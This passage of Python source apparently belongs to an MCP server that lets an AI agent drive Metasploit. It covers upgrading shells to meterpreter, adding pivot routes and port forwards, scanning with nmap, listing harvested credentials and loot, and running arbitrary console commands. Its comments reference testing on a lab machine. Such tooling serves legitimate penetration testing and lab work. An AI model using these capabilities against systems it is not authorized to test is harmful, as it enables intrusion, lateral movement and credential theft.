            await self._ensure_connected()

            sessions_dict = self.client.sessions.list
            if str(session_id) not in sessions_dict and int(session_id) not in sessions_dict:
                return ToolResult(
                    success=False,
                    data={"shell_session_id": session_id},
                    error=f"Session {session_id} not found",
                    error_class="invalid_parameter",
                    retryable=False,
                    suggestions=["Run list_sessions to enumerate active sessions"],
                )

            before = set(sessions_dict.keys())
            cmds = [f"sessions -u {session_id}"]
            if lhost:
                cmds.insert(0, f"setg LHOST {lhost}")
            if lport:
                cmds.insert(0, f"setg LPORT {lport}")
            output = await self._console_exec("\n".join(cmds), timeout=timeout)

            # Poll for new meterpreter session up to ~30s
            new_meterpreter = None
            for _ in range(30):
                await asyncio.sleep(1)
                current = self.client.sessions.list
                new_ids = set(current.keys()) - before
                for sid in new_ids:
                    s = current[sid]
                    if "meterpreter" in str(s.get("type", "")).lower():
                        new_meterpreter = int(sid)
                        break
                if new_meterpreter is not None:
                    break

            # Probe the new session to confirm responsiveness
            session_responsive = False
            if new_meterpreter is not None:
                try:
                    info = self.client.sessions.list.get(str(new_meterpreter)) or \
                           self.client.sessions.list.get(new_meterpreter)
                    if info:
                        sess = MeterpreterSession(new_meterpreter, self.client, info)
                        probe = await asyncio.to_thread(
                            lambda: sess.run_with_output("getuid", timeout=10)
                        )
                        probe_str = probe if isinstance(probe, str) else probe.get("data", "")
                        session_responsive = bool(probe_str.strip())
                except Exception as probe_e:
                    self.logger.warning(f"upgrade probe failed: {probe_e!r}")

            return ToolResult(
                success=True,
                data={
                    "shell_session_id": session_id,
                    "meterpreter_session_id": new_meterpreter,
                    "upgrade_success": new_meterpreter is not None,
                    "session_responsive": session_responsive,
                },
                raw_output=sanitize_output(output),
            )
        except Exception as e:
            return self._msf_error("session_upgrade", e)

    async def module_info(self, module: str) -> ToolResult:
        """Return structured module metadata — name, description, options, targets, refs.

        Uses the ``module.info`` and ``module.options`` RPCs (via
        pymetasploit3's ``MsfModule``) so we get typed records back, no
        console parsing. A bad path raises ``MsfRpcError`` from the RPC
        layer, which is mapped to ``MsfApiError`` — eliminates the prior
        bug where a failed ``use <bad/path>`` left the previous module
        loaded and ``info`` returned stale data.
        """
        self.logger.info(f"Getting module info for {module}")
        if err := self._validate_arg("module", module): return err

        # Module path comes in as ``exploit/windows/smb/ms17_010_eternalblue``
        # — the RPC takes (mtype, mname) where mname is the path AFTER
        # the type prefix.
        if "/" not in module:
            return mcp_error_to_result(ValidationError(
                f"Module path must include type prefix (e.g. exploit/...): {module}",
                suggestions=["Use search_modules to find a fully-qualified path"],
            ))
        mtype, _, mname = module.partition("/")
        if mtype not in ("exploit", "auxiliary", "post", "payload", "encoder", "evasion", "nop"):
            return mcp_error_to_result(ValidationError(
                f"Unknown module type: {mtype}",
                suggestions=["Valid types: exploit, auxiliary, post, payload, encoder, evasion, nop"],
            ))

        try:
            await self._ensure_connected()

            def _load():
                m = self.client.modules.use(mtype, mname)
                # Build a JSON-safe options dict — pymetasploit3 stores
                # the raw RPC dict in ``_moptions`` (keyed by option name).
                options = {
                    name: {
                        "type": meta.get("type"),
                        "required": meta.get("required", False),
                        "advanced": meta.get("advanced", False),
                        "evasion": meta.get("evasion", False),
                        "default": meta.get("default"),
                        "desc": meta.get("desc"),
                        "enums": meta.get("enums"),
                    }
                    for name, meta in m._moptions.items()
                }
                return {
                    "module": module,
                    "type": mtype,
                    "name": getattr(m, "name", None),
                    "description": getattr(m, "description", None),
                    "rank": getattr(m, "rank", None),
                    "license": getattr(m, "license", None),
                    "authors": getattr(m, "authors", None),
                    "references": getattr(m, "references", None),
                    "platform": getattr(m, "platform", None),
                    "arch": getattr(m, "arch", None),
                    "privileged": getattr(m, "privileged", None),
                    "disclosure_date": getattr(m, "disclosure_date", None),
                    "default_target": getattr(m, "default_target", None),
                    "targets": getattr(m, "targets", None),
                    "actions": getattr(m, "actions", None),
                    "options": options,
                    "required_options": list(m.required),
                }

            info = await asyncio.to_thread(_load)
            return ToolResult(success=True, data=info)
        except Exception as e:
            return self._msf_error("module_info", e)

    async def route_add(self, subnet: str, netmask: str, session_id: int) -> ToolResult:
        """Add a route through a session for pivoting (route add).

        msfconsole emits a cosmetic ``[-] Invalid :session, expected
        Session object`` warning on this version even when the route is
        applied. We confirm by querying ``route print`` after — the
        ``route_added`` field tells the agent whether the table actually
        reflects the change without re-parsing raw output.
        """
        self.logger.info(f"Adding route {subnet} {netmask} via session {session_id}")
        if err := self._validate_arg("subnet", subnet): return err
        if err := self._validate_arg("netmask", netmask): return err
        try:
            await self._ensure_connected()
            output = await self._console_exec(
                f"route add {subnet} {netmask} {session_id}", timeout=10)

            # Verify by querying route print
            verify = await self._console_exec("route print", timeout=10)
            route_added = subnet in verify and (
                netmask in verify or self._netmask_to_cidr(netmask) in verify
            )

            return ToolResult(
                success=True,
                data={
                    "subnet": subnet,
                    "netmask": netmask,
                    "session_id": session_id,
                    "route_added": route_added,
                },
                raw_output=sanitize_output(output),
            )
        except Exception as e:
            return self._msf_error("route_add", e)

    @staticmethod
    def _netmask_to_cidr(netmask: str) -> str:
        """Convert dotted netmask to /CIDR. Returns '' if not parseable."""
        try:
            octets = netmask.split(".")
            if len(octets) != 4:
                return ""
            bits = sum(bin(int(o)).count("1") for o in octets)
            return f"/{bits}"
        except (ValueError, AttributeError):
            return ""

    async def route_list(self) -> ToolResult:
        """List active routes (route print). Returns parsed rows."""
        self.logger.info("Listing routes")
        try:
            await self._ensure_connected()
            output = await self._console_exec("route print", timeout=10)
            routes = self._parse_msf_table(output)
            return ToolResult(
                success=True,
                data={"routes": routes, "count": len(routes)},
                raw_output=sanitize_output(output),
            )
        except Exception as e:
            return self._msf_error("route_list", e)

    async def route_delete(self, subnet: str, netmask: str, session_id: int) -> ToolResult:
        """Delete a route.

        Uses ``route remove <subnet> <netmask> <sid>`` — msfconsole 6.4
        REQUIRES the session id (verified live: ``route remove
        10.129.200.0 255.255.255.0`` errors with "Missing arguments to
        route remove" on Blue, while ``route remove 10.129.200.0
        255.255.255.0 1`` succeeds despite emitting an internal "Invalid
        :session" warning that's cosmetic).

        ``delete`` is NOT a valid keyword in this version (``remove`` and
        ``del`` are the only aliases) — passing ``delete`` falls through
        to the usage banner with exit 0 and the route stays in place.
        """
        self.logger.info(f"Deleting route {subnet} {netmask} sid={session_id}")
        if err := self._validate_arg("subnet", subnet): return err
        if err := self._validate_arg("netmask", netmask): return err
        try:
            await self._ensure_connected()
            output = await self._console_exec(
                f"route remove {subnet} {netmask} {session_id}", timeout=10)

            # Verify removal via route print
            verify = await self._console_exec("route print", timeout=10)
            route_removed = subnet not in verify

            return ToolResult(
                success=True,
                data={
                    "subnet": subnet,
                    "netmask": netmask,
                    "session_id": session_id,
                    "route_removed": route_removed,
                },
                raw_output=sanitize_output(output),
            )
        except Exception as e:
            return self._msf_error("route_delete", e)

    # ── portfwd helpers ──────────────────────────────────────────────────
    #
    # IMPORTANT: portfwd MUST run through the meterpreter session API
    # directly (``session.run_with_output``), NOT through the shared
    # msfconsole and ``sessions -i N -c "portfwd ..."``.
    #
    # We hit this live on Blue (Win7 SP1, meterpreter session 1):
    #   sessions -i 1 -c "portfwd add -l 4499 -p 445 -r 127.0.0.1"
    #   → [-] Failed: Rex::Post::Meterpreter::RequestError
    #     stdapi_sys_process_execute: Operation failed: The system cannot
    #     find the file specified
    #
    # msfconsole's ``sessions -c <cmd>`` dispatches the string to the
    # session's *shell* path, not its meterpreter command interpreter, so
    # ``portfwd add ...`` is interpreted as a Windows binary name and
    # spawned via stdapi_sys_process_execute (fails with errno 2).
    # ``session.run_with_output('portfwd add ...')`` reaches the
    # meterpreter command parser directly, which is where ``portfwd`` is
    # registered as a built-in console command.
    async def _meterpreter_run(self, session_id: int, cmd: str, timeout: int = 15) -> str:
        async with self._op_lock:
            await self._ensure_connected()
            sessions = self.client.sessions.list
            info = sessions.get(str(session_id)) or sessions.get(session_id)
            if info is None:
                raise ToolError(
                    message=f"Session {session_id} not found",
                    details=f"Active sessions: {[int(k) for k in sessions.keys()]}",
                )
            if info.get("type") != "meterpreter":
                raise ToolError(
                    message=f"Session {session_id} is type={info.get('type')!r}, not meterpreter",
                    details="portfwd is a meterpreter built-in; shell sessions can't bind ports.",
                )
            session = MeterpreterSession(session_id, self.client, info)
            output = await asyncio.to_thread(
                lambda: session.run_with_output(cmd, timeout=timeout)
            )
            return output if isinstance(output, str) else output.get("data", "")

    async def portfwd_add(self, session_id: int, local_port: int,
                          remote_host: str, remote_port: int) -> ToolResult:
        """Set up port forwarding through a meterpreter session.

        Maps to meterpreter `portfwd add -l <local> -p <remote_port> -r <remote_host>`.
        Local-bind on attacker, traffic proxied through session to remote_host:remote_port.
        """
        self.logger.info(
            f"portfwd add session={session_id} -l {local_port} -p {remote_port} "
            f"-r {remote_host}"
        )
        if err := self._validate_arg("remote_host", remote_host): return err
        try:
            output = await self._meterpreter_run(
                session_id,
                f"portfwd add -l {local_port} -p {remote_port} -r {remote_host}",
                timeout=15,
            )
            return ToolResult(
                success=True,
                data={
                    "session_id": session_id,
                    "local_port": local_port,
                    "remote_host": remote_host,
                    "remote_port": remote_port,
                },
                raw_output=sanitize_output(output),
            )
        except Exception as e:
            return self._msf_error("portfwd_add", e)

    async def portfwd_list(self, session_id: int) -> ToolResult:
        """List active port forwards in a meterpreter session. Returns parsed rows."""
        self.logger.info(f"portfwd list session={session_id}")
        try:
            output = await self._meterpreter_run(session_id, "portfwd list", timeout=15)
            forwards = self._parse_msf_table(output)
            return ToolResult(
                success=True,
                data={
                    "session_id": session_id,
                    "forwards": forwards,
                    "count": len(forwards),
                },
                raw_output=sanitize_output(output),
            )
        except Exception as e:
            return self._msf_error("portfwd_list", e)

    async def portfwd_delete(self, session_id: int, local_port: int) -> ToolResult:
        """Delete a port forward."""
        self.logger.info(f"portfwd delete session={session_id} -l {local_port}")
        try:
            output = await self._meterpreter_run(
                session_id, f"portfwd delete -l {local_port}", timeout=15
            )
            return ToolResult(
                success=True,
                data={"session_id": session_id, "local_port": local_port},
                raw_output=sanitize_output(output),
            )
        except Exception as e:
            return self._msf_error("portfwd_delete", e)

    async def db_nmap(self, args: str, timeout: int = 600) -> ToolResult:
        """Run nmap inside msfconsole — auto-imports results into workspace DB.

        Detects the most common nmap-side failure modes that previously
        returned ``success=True`` with an error in raw_output:
        ``Database not connected`` (msfdb init failed); ``Couldn't find
        network interface`` (bad interface flag); ``Failed to resolve``
        (bad target); ``QUITTING`` (nmap fatal error).
        """
        self.logger.info(f"db_nmap {args}")
        if err := self._validate_arg("args", args): return err
        try:
            await self._ensure_connected()
            output = await self._console_exec(f"db_nmap {args}", timeout=timeout)

            output_lower = output.lower()
            failure_patterns = [
                ("database not connected", "tool_misconfigured",
                 "msfdb didn't initialize at container start. Restart the container or run db_connect via run_console."),
                ("couldn't find network interface", "invalid_parameter",
                 "Bad -e <interface> flag. Container's interface is typically eth0 inside; let nmap auto-pick."),
                ("failed to resolve", "invalid_parameter",
                 "Target hostname couldn't be resolved. Check the IP/hostname; from inside the container only VPN-routed IPs work without DNS."),
                ("quitting", "tool_misconfigured",
                 "Nmap exited fatally. Check raw_output for the specific reason."),
                ("you requested a scan type which requires root", "permission_denied",
                 "Scan type (e.g. -sS, -O) needs raw sockets. The container doesn't run privileged by default — drop to -sT or run with privileged=true."),
                ("unrecognized option", "invalid_parameter",
                 "nmap rejected an unknown flag. Check the args string against `nmap --help`."),
                ("invalid argument", "invalid_parameter",
                 "nmap rejected an argument value. See raw_output for which one."),
                ("no targets were specified", "invalid_parameter",
                 "args must include at least one target IP or CIDR."),
                ("nmap: '/usr/lib/nmap/nmap:", "invalid_parameter",
                 "nmap reported an argument error. See raw_output for the specific flag."),
            ]
            for marker, err_class, suggestion in failure_patterns:
                if marker in output_lower:
                    return ToolResult(
                        success=False,
                        data={"args": args},
                        error=f"db_nmap failed: {marker}",
                        error_class=err_class,
                        retryable=False,
                        suggestions=[suggestion],
                        raw_output=sanitize_output(output),
                    )

            return ToolResult(
                success=True,
                data={"args": args},
                raw_output=sanitize_output(output),
            )
        except Exception as e:
            return self._msf_error("db_nmap", e)

    async def db_import(self, file_path: str) -> ToolResult:
        """Import scan data from a file (nmap XML, nessus, etc.)."""
        self.logger.info(f"db_import {file_path}")
        if err := self._validate_arg("file_path", file_path): return err
        if not os.path.exists(file_path):
            return ToolResult(
                success=False,
                data={"file_path": file_path},
                error=f"File not found: {file_path}",
                error_class="invalid_parameter",
                retryable=False,
                suggestions=[
                    "Verify the path exists inside the container (use /session/<file> for files written from outside)",
                ],
            )
        try:
            await self._ensure_connected()
            output = await self._console_exec(f"db_import {file_path}", timeout=60)
            return ToolResult(
                success=True,
                data={"file_path": file_path},
                raw_output=sanitize_output(output),
            )
        except Exception as e:
            return self._msf_error("db_import", e)

    def _workspace(self, name: str = "default"):
        """Return a pymetasploit3 ``Workspace`` for the given name.

        Lazily creates the workspace if it doesn't exist (matches
        msfconsole's behavior). All structured DB queries flow through
        here — hosts/services/creds/loots/notes are properties on the
        returned object and call the corresponding ``db.*`` RPC.
        """
        return self.client.db.workspaces.workspace(name)

    async def list_hosts(
        self,
        address: Optional[str] = None,
        limit: int = InputValidator.LIMIT_DEFAULT,
        offset: int = 0,
    ) -> ToolResult:
        """List hosts via the ``db.hosts`` RPC. No console output parsing."""
        self.logger.info(f"Listing hosts (filter: {address})")
        if address:
            if err := self._validate_arg("address", address): return err
        try:
            InputValidator.validate_pagination(limit, offset)
        except ValidationError as e:
            return mcp_error_to_result(e)
        try:
            await self._ensure_connected()

            def _query():
                ws = self._workspace()
                if address:
                    return ws.hosts.find(addresses=[address])
                return ws.hosts.list

            hosts = await asyncio.to_thread(_query)
            page, meta = paginate(hosts, limit, offset)
            return ToolResult(
                success=True,
                data={
                    "address_filter": address,
                    "hosts": page,
                    "count": len(page),
                    **meta,
                },
            )
        except Exception as e:
            return self._msf_error("list_hosts", e)

    async def list_services(
        self,
        host: Optional[str] = None,
        port: Optional[int] = None,
        limit: int = InputValidator.LIMIT_DEFAULT,
        offset: int = 0,
    ) -> ToolResult:
        """List services via the ``db.services`` RPC. No console parsing."""
        self.logger.info(f"Listing services (host: {host}, port: {port})")
        if host:
            if err := self._validate_arg("host", host): return err
        try:
            InputValidator.validate_pagination(limit, offset)
        except ValidationError as e:
            return mcp_error_to_result(e)
        try:
            await self._ensure_connected()

            def _query():
                ws = self._workspace()
                kwargs = {}
                if host:
                    kwargs["addresses"] = [host]
                if port is not None:
                    kwargs["ports"] = str(port)
                return ws.services.find(**kwargs) if kwargs else ws.services.list

            services = await asyncio.to_thread(_query)
            page, meta = paginate(services, limit, offset)
            return ToolResult(
                success=True,
                data={
                    "host_filter": host,
                    "port_filter": port,
                    "services": page,
                    "count": len(page),
                    **meta,
                },
            )
        except Exception as e:
            return self._msf_error("list_services", e)

    async def list_creds(
        self,
        host: Optional[str] = None,
        limit: int = InputValidator.LIMIT_DEFAULT,
        offset: int = 0,
    ) -> ToolResult:
        """List credentials via the ``db.creds`` RPC. No console parsing."""
        self.logger.info(f"Listing creds (host: {host})")
        if host:
            if err := self._validate_arg("host", host): return err
        try:
            InputValidator.validate_pagination(limit, offset)
        except ValidationError as e:
            return mcp_error_to_result(e)
        try:
            await self._ensure_connected()

            def _query():
                ws = self._workspace()
                if host:
                    return ws.creds.find(addresses=[host])
                return ws.creds.list

            creds = await asyncio.to_thread(_query)
            page, meta = paginate(creds, limit, offset)
            return ToolResult(
                success=True,
                data={
                    "host_filter": host,
                    "creds": page,
                    "count": len(page),
                    **meta,
                },
            )
        except Exception as e:
            return self._msf_error("list_creds", e)

    async def list_loot(
        self,
        limit: int = InputValidator.LIMIT_DEFAULT,
        offset: int = 0,
    ) -> ToolResult:
        """List loot via the ``db.loots`` RPC. No console parsing."""
        self.logger.info("Listing loot")
        try:
            InputValidator.validate_pagination(limit, offset)
        except ValidationError as e:
            return mcp_error_to_result(e)
        try:
            await self._ensure_connected()
            loot = await asyncio.to_thread(lambda: self._workspace().loots.list)
            page, meta = paginate(loot, limit, offset)
            return ToolResult(
                success=True,
                data={"loot": page, "count": len(page), **meta},
            )
        except Exception as e:
            return self._msf_error("list_loot", e)

    async def list_notes(
        self,
        limit: int = InputValidator.LIMIT_DEFAULT,
        offset: int = 0,
    ) -> ToolResult:
        """List engagement notes via the ``db.notes`` RPC. No console parsing."""
        self.logger.info("Listing notes")
        try:
            InputValidator.validate_pagination(limit, offset)
        except ValidationError as e:
            return mcp_error_to_result(e)
        try:
            await self._ensure_connected()
            notes = await asyncio.to_thread(lambda: self._workspace().notes.list)
            page, meta = paginate(notes, limit, offset)
            return ToolResult(
                success=True,
                data={"notes": page, "count": len(page), **meta},
            )
        except Exception as e:
            return self._msf_error("list_notes", e)

    async def run_resource_script(self, commands: str, timeout: int = 600) -> ToolResult:
        """Execute a sequence of msfconsole commands (resource script).

        Maps to msfconsole `resource <file.rc>` but accepts inline content.
        We write the commands to a temp .rc file inside the container, then
        invoke `resource`. Useful for repeatable workflows or chained
        commands the named methods don't cover cleanly.
        """
        if not commands or not commands.strip():
            return ToolResult(
                success=False,
                data={},
                error="commands is empty or whitespace-only",
                error_class="invalid_parameter",
                retryable=False,
                suggestions=[
                    "Pass at least one msfconsole command (one per line)",
                    "For a single command use run_console instead",
                ],
            )
        self.logger.info(f"Running resource script ({commands.count(chr(10))+1} lines)")
        try:
            await self._ensure_connected()
            with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
                f.write(commands)
                rc_path = f.name
            try:
                output = await self._console_exec(f"resource {rc_path}", timeout=timeout)
                return ToolResult(
                    success=True,
                    data={"commands_count": commands.count("\n") + 1},
                    raw_output=sanitize_output(output),
                )
            finally:
                try:
                    os.unlink(rc_path)
                except OSError:
                    pass
        except Exception as e:
            return self._msf_error("run_resource_script", e)

    async def run_console(self, command: str, timeout: int = 60) -> ToolResult:
        """Generic msfconsole escape hatch.

        Power feature — execute arbitrary msfconsole input. Use sparingly;
        prefer the structured named methods when they fit. Useful for niche
        `show` variants, plugin commands, debugging, or workflows that don't
        cleanly map to any named method.
        """
        self.logger.info(
            f"Running console command ({len(command)} chars, "
            f"first 80: {command[:80]!r})"
        )
        try:
            await self._ensure_connected()
            output = await self._console_exec(command, timeout=timeout)
            return ToolResult(
                success=True,
                data={"command_length": len(command)},
                raw_output=sanitize_output(output),
            )
        except Exception as e:
            return self._msf_error("run_console", e)


if __name__ == "__main__":
    MetasploitServer.main()
